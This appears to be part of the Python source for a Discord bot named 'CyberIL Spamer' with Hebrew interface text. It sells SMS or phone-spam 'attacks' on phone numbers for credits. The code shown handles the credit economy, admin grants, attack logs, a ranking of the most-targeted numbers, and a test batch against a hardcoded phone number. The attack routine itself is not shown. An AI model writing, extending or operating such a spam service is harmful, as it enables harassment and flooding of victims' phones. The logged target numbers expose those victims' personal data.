async def get_top_targets(limit: int = 10):
    pipeline = [
        {"$group": {
            "_id": "$phone",
            "count": {"$sum": 1},
            "success_total": {"$sum": "$success_count"}
        }},
        {"$sort": {"count": -1}},
        {"$limit": limit}
    ]
    return await logs_collection.aggregate(pipeline).to_list(length=limit)

@client.event
async def on_ready():
    client.add_view(MainPanel())
    client.add_view(FreeCoins())
    await tree.sync()
    print(f"✅ CyberIL Spamer פעיל → {client.user}")
    print(f"📡 מחובר ל-{len(client.guilds)} שרתים")

    await asyncio.sleep(2)

    try:
        main_ch = client.get_channel(PANEL_CHANNEL)
        if main_ch:
            await main_ch.purge(limit=5)
            await main_ch.send(embed=create_panel(), view=MainPanel())
            print(f"✅ פאנל נשלח ל-{main_ch.name}")

        gift_ch = client.get_channel(GIFT_CHANNEL)
        if gift_ch:
            await gift_ch.purge(limit=5)
            await gift_ch.send(embed=create_gift_panel(), view=FreeCoins())
            print(f"✅ הודעת קרדיטים נשלחה ל-{gift_ch.name}")

    except Exception as e:
        print(f"❌ שגיאה: {e}")

@tree.command(name="credit", description="בדוק יתרת קרדיטים")
async def cmd_credit(interaction: discord.Interaction):
    await cmd_credits(interaction)

@tree.command(name="credits", description="בדוק יתרת קרדיטים")
@app_commands.describe(member="משתמש לבדיקה")
async def cmd_credits(interaction: discord.Interaction, member: discord.Member = None):
    target = member or interaction.user
    bal = await format_balance(target.id)
    stats = await get_user_stats(target.id)

    embed = discord.Embed(title="💎 קרדיטים", description=f"{target.mention} — **{bal}**", color=COLOR_ACCENT)
    if stats:
        embed.add_field(name="📊 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
        embed.add_field(name="✅ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="addcredit", description="[ADMIN] הוסף קרדיטים")
@app_commands.describe(member="משתמש", amount="כמות")
async def cmd_addcredit(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    if amount <= 0:
        await interaction.response.send_message("❌ כמות חייבת להיות חיובית", ephemeral=True)
        return
    await add_credits(member.id, amount)
    new_bal = await format_balance(member.id)
    embed = discord.Embed(title="✅ קרדיטים נוספו", color=COLOR_SUCCESS)
    embed.add_field(name="משתמש", value=member.mention, inline=True)
    embed.add_field(name="נוסף", value=str(amount), inline=True)
    embed.add_field(name="יתרה", value=new_bal, inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="removecredit", description="[ADMIN] הסר קרדיטים")
@app_commands.describe(member="משתמש", amount="כמות")
async def cmd_removecredit(interaction: discord.Interaction, member: discord.Member, amount: int):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    if amount <= 0:
        await interaction.response.send_message("❌ כמות חייבת להיות חיובית", ephemeral=True)
        return
    await remove_credits(member.id, amount)
    new_bal = await format_balance(member.id)
    embed = discord.Embed(title="🗑️ קרדיטים הוסרו", color=COLOR_WARNING)
    embed.add_field(name="משתמש", value=member.mention, inline=True)
    embed.add_field(name="הוסר", value=str(amount), inline=True)
    embed.add_field(name="יתרה", value=new_bal, inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="lifetime", description="[ADMIN] הענק ללא הגבלה")
@app_commands.describe(member="משתמש")
async def cmd_lifetime(interaction: discord.Interaction, member: discord.Member):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.defer()
    await set_unlimited(member.id, True)
    embed = discord.Embed(title="♾️ ללא הגבלה הוענק", description=f"{member.mention} קיבל ללא הגבלה", color=COLOR_SUCCESS)
    await interaction.followup.send(embed=embed)

@tree.command(name="removelifetime", description="[ADMIN] הסר ללא הגבלה")
@app_commands.describe(member="משתמש")
async def cmd_removelifetime(interaction: discord.Interaction, member: discord.Member):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.defer()
    await set_unlimited(member.id, False)
    embed = discord.Embed(title="♾️ ללא הגבלה הוסר", description=f"{member.mention} איבד את ה-lifetime", color=COLOR_WARNING)
    await interaction.followup.send(embed=embed)

@tree.command(name="freecredits", description="[ADMIN] שלח הודעת קרדיטים")
async def cmd_freecredits(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.send_message(embed=create_gift_panel(), view=FreeCoins())

@tree.command(name="giveall", description="[ADMIN] תן לכולם")
@app_commands.describe(amount="כמות")
async def cmd_giveall(interaction: discord.Interaction, amount: int):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    if amount <= 0:
        await interaction.followup.send("❌ כמות חייבת להיות חיובית", ephemeral=True)
        return
    await users_collection.update_many({}, {"$inc": {"credits": amount}})
    await interaction.followup.send(f"✅ ניתנו {amount} קרדיטים לכולם", ephemeral=True)

@tree.command(name="transfer", description="העבר קרדיטים")
@app_commands.describe(member="מקבל", amount="כמות")
async def cmd_transfer(interaction: discord.Interaction, member: discord.Member, amount: int):
    await interaction.response.defer(ephemeral=True)
    if amount < 20:
        await interaction.followup.send("❌ מינימום העברה 20", ephemeral=True)
        return
    if interaction.user.id == member.id:
        await interaction.followup.send("❌ אי אפשר להעביר לעצמך", ephemeral=True)
        return

    uid = interaction.user.id
    if await has_unlimited(uid):
        await interaction.followup.send("❌ משתמשי lifetime לא יכולים להעביר", ephemeral=True)
        return

    bal = await fetch_balance(uid)
    if bal < amount:
        await interaction.followup.send(f"❌ אין מספיק קרדיטים", ephemeral=True)
        return

    await remove_credits(uid, amount)
    await add_credits(member.id, amount)

    embed = discord.Embed(title="💸 העברה הושלמה", color=COLOR_SUCCESS)
    embed.add_field(name="מאת", value=interaction.user.mention, inline=True)
    embed.add_field(name="אל", value=member.mention, inline=True)
    embed.add_field(name="כמות", value=f"{amount}", inline=True)
    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="mylogs", description="הצג לוגים")
async def cmd_mylogs(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    logs = await get_user_logs(interaction.user.id, 10)

    if not logs:
        await interaction.followup.send("📭 אין מתקפות", ephemeral=True)
        return

    embed = discord.Embed(title="📋 לוגים", color=COLOR_INFO)
    for log in logs:
        embed.add_field(
            name=f"{log['date']} {log['time']}",
            value=f"📱 {log['phone']}\n✅ {log['success_count']}",
            inline=False
        )
    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="checkstatus", description="[ADMIN] בדוק סטטוס")
async def cmd_checkstatus(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    test_num = "0506500708"
    success = await run_single_batch(test_num)

    embed = discord.Embed(title="📊 בדיקת מערכת", color=COLOR_INFO)
    embed.add_field(name="✅ בקשות שנשלחו", value=str(success), inline=True)
    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="attacklogs", description="[ADMIN] לוגים")
@app_commands.describe(limit="כמות")
async def cmd_attacklogs(interaction: discord.Interaction, limit: int = 10):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    logs = await get_all_logs(min(limit, 50))

    if not logs:
        await interaction.followup.send("📭 אין לוגים", ephemeral=True)
        return

    embed = discord.Embed(title="📋 לוגים אחרונים", color=COLOR_INFO)
    for log in logs[:10]:
        embed.add_field(
            name=f"{log['username']} | {log['date']} {log['time']}",
            value=f"📱 {log['phone']}\n✅ {log['success_count']}",
            inline=False
        )
    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="topnumbers", description="[ADMIN] מספרים מובילים")
async def cmd_topnumbers(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    top = await get_top_targets(10)

    if not top:
        await interaction.followup.send("📭 אין נתונים", ephemeral=True)
        return

    embed = discord.Embed(title="🎯 מספרים מובילים", color=COLOR_INFO)
    for i, item in enumerate(top, 1):
        embed.add_field(
            name=f"{i}. {item['_id']}",
            value=f"מתקפות: {item['count']}",
            inline=False
        )
    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="globalstats", description="[ADMIN] סטטיסטיקה גלובלית")
async def cmd_globalstats(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    stats = await get_global_stats()

    if not stats:
        await interaction.followup.send("📭 אין נתונים", ephemeral=True)
        return

    embed = discord.Embed(title="📊 סטטיסטיקה גלובלית", color=COLOR_INFO)
    embed.add_field(name="🎯 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
    embed.add_field(name="👥 משתמשים", value=str(stats.get("unique_users", 0)), inline=True)
    embed.add_field(name="💎 קרדיטים", value=str(stats.get("total_cost", 0)), inline=True)
    embed.add_field(name="✅ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
    await interaction.followup.send(embed=embed, ephemeral=True)

@tree.command(name="restart", description="[ADMIN] אתחל בוט")
async def cmd_restart(interaction: discord.Interaction):
    if not is_admin(interaction):
        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
        return
    await interaction.response.send_message("🔄 מאתחל...", ephemeral=True)
    await client.close()
    os.execv(sys.executable, [sys.executable] + sys.argv)

if __name__ == "__main__":
    client.run(TOKEN)
